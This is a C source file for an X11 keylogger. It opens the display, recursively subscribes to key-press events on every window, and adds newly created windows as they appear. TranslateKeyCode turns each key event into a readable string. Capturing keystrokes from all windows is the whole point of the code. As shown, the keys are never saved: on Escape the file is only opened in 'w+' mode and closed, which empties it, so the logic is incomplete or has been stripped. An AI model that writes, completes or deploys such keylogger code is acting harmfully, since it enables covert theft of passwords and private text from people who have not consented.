#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <netdb.h>
#include <string.h>
#include <netinet/in.h>
#include <X11/X.h>
#include <X11/Xlib.h>
#include <X11/Intrinsic.h>
#include <X11/StringDefs.h>
#include <X11/Xutil.h>
#include <X11/Shell.h>

#define SIZE 256
static   char key_buff[SIZE];
Display *d;

void sigint()
{
  if (d)
    XCloseDisplay(d);
  exit(0);
}

void select_window(Display *d, Window window, Bool top)
{
  XWindowAttributes attrs;
  long events;

  XGetWindowAttributes(d, window, &attrs);
  events = ((attrs.all_event_masks | attrs.do_not_propagate_mask) & KeyPressMask);
  XSelectInput(d, window, (StructureNotifyMask | SubstructureNotifyMask | events));
}

void snoop_all_windows(Window window, Bool top)
{
  Window  root, parent, *children;
  int nchildren;
  char * name;
  XClassHint *h;

  if (!XQueryTree(d, window, &root, &parent, &children, &nchildren))
    return;
  if (XFetchName(d, window, &name)) {
    fflush(stdout);
    XFree(name);
  }
  select_window(d, window, top);
  if (children) {
    while (nchildren)
      snoop_all_windows(children[--nchildren], top);
    XFree(children);
  }
}

char * TranslateKeyCode(XEvent *ev)
{
  int    count;
  char * tmp;
  KeySym ks;

  if (ev) {
    count = XLookupString((XKeyEvent *) ev, key_buff, SIZE, &ks, NULL);
    key_buff[count] = '\0';
    if (count == 0) {
      if (tmp = XKeysymToString(ks))
        strcpy(key_buff, tmp);
      else
        strcpy(key_buff, "");
    }
    return(key_buff);
  }
  else
    return(NULL);
}

void keylogger(const char * file_name)
{
  FILE *  fp;
  char    host[128], *name, *string, *p;
  int     last = -1, lastcreated = -1, nchildren;
  XEvent  xev;
  Window  window, root, parent, *children;

  if ((p = getenv("DISPLAY")) != NULL)
    strcpy(host, p);
  else
    strcpy(host, ":0");
  if ((d = XOpenDisplay(host)) == NULL) {
    exit(1);
  }

  signal(SIGINT, sigint);
  XSetCloseDownMode(d, RetainPermanent);
  snoop_all_windows(DefaultRootWindow(d), True);
  while (1) {
    XNextEvent(d, &xev);
    name = NULL;
    children = NULL;
    fflush(stdout);
    switch (xev.xany.type) {
      case KeyPress:
        if (xev.xkey.window != last) {
          last = xev.xkey.window;
          window = last;
          if (!XFetchName(d, window, &name)) {
            if (XQueryTree(d, window, &root, &parent, &children, &nchildren)) {
              if (parent && XFetchName(d, parent, &name))
                window = parent;
            }
          }
          if (name)
            XFree(name);
          if (children)
            XFree(children);
        }

        if ((string = TranslateKeyCode(&xev)) == NULL)
          continue;
        if(string[0] == 27) {
          XCloseDisplay(d);
          fp = fopen(file_name, "w+");
          fclose(fp);
          return;
        }
        break;
      case CreateNotify:
        if(lastcreated!=xev.xcreatewindow.window) {
          lastcreated = xev.xcreatewindow.window;
          select_window(d, lastcreated, True);
          if(XFetchName(d, lastcreated, &name)) {
            XFree(name);
          }
        }
        break;
    }
  }
}
